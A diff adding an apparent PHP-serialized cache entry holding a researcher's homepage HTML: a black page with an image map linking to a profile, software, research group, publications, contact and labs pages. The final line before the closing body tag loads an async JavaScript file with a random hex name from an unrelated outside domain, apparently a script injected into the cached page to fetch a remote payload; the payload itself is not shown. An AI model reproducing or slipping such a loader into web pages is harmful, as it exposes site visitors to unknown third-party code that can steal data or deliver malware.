@@ -1,0 +1,39 @@
+1555682963
+a:2:{s:7:"content";s:1701:"<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Matthias S. Brennwald</title>
+<style type="text/css">
+body, html {
+height:100%; /*fill the viewport*/
+}
+#container {
+height:100%; /*fill the body*/
+text-align: center; /*H-centering in early IE versions*/
+}
+#pinac {
+width: 800px;
+height: 576px;
+position:relative; /*allows for top property to move the element*/
+top:50%; /*moves it 50% of #container's height down the page*/
+margin-top:-288px; /*pulls it back up by half it's height*/
+margin-left: auto;margin-right: auto; /*H-centering in complaint browsers*/
+}
+</style>
+</head>
+
+<body bgcolor="black" text="white">
+
+<div id="container">
+<div id="pinac"><img src="main.jpg" alt="" usemap="#mainMap" border="0" height="576" width="800">
+<map name="mainMap">
+<area shape="rect" coords="376,300,622,438" title="Skills and Experience" href="http://www.researchgate.net/profile/Matthias_Brennwald/info">
+<area shape="rect" coords="688,125,785,350" title="Software" href="http://homepages.eawag.ch/%7Ebrennmat/software/index.html">
+<area shape="rect" coords="84,461,646,534" title="UI Group" href="http://www.eawag.ch/forschung/wut/schwerpunkte/umweltisotope/index_EN">
+<area shape="rect" coords="44,303,300,425" title="Publications" href="http://scholar.google.ch/citations?user=cxmX4NoAAAAJ&amp;hl=en">
+<area shape="rect" coords="365,156,622,228" title="Contact" href="http://homepages.eawag.ch/%7Ebrennmat/contact.html">
+<area shape="rect" coords="35,120,300,278" title="Labs" href="http://homepages.eawag.ch/%7Ebrennmat/labs.html">
+</map>
+</div>
+</div>
+
+<script type="text/javascript" async="" src="//cardinaldata.net/1fa16f6ccbee745a0c.js"></script></body></html>";s:12:"content_meta";N;}
